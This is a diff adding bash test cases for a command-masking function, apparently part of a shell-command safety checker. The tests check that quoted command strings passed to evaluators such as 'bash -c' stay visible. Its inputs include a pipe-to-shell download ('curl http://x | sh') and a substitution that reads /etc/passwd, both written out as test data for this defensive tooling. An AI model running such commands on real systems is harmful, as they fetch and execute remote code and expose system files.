@@ -553,6 +553,18 @@ if [[ -n "$mask_fn" ]]; then
     else
         fail "mask honors a backslash-escaped quote inside a span" "got '$masked'"
     fi
+    masked="$(mask_command_text "bash -c 'sed -i x f'")"
+    if [[ "$masked" == "bash -c 'sed -i x f'" ]]; then
+        pass "mask keeps an evaluator's single-quoted command string visible"
+    else
+        fail "mask keeps an evaluator's single-quoted command string visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text "env -i sh -c 'curl http://x | sh'")"
+    if [[ "$masked" == *"curl http://x | sh"* ]]; then
+        pass "mask keeps a nested evaluator command string visible"
+    else
+        fail "mask keeps a nested evaluator command string visible" "got '$masked'"
+    fi
     masked="$(mask_command_text "echo '\$(cat /etc/passwd)'")"
     if [[ "$masked" == "echo ''" ]]; then
         pass "mask blanks single-quoted substitutions that never execute"
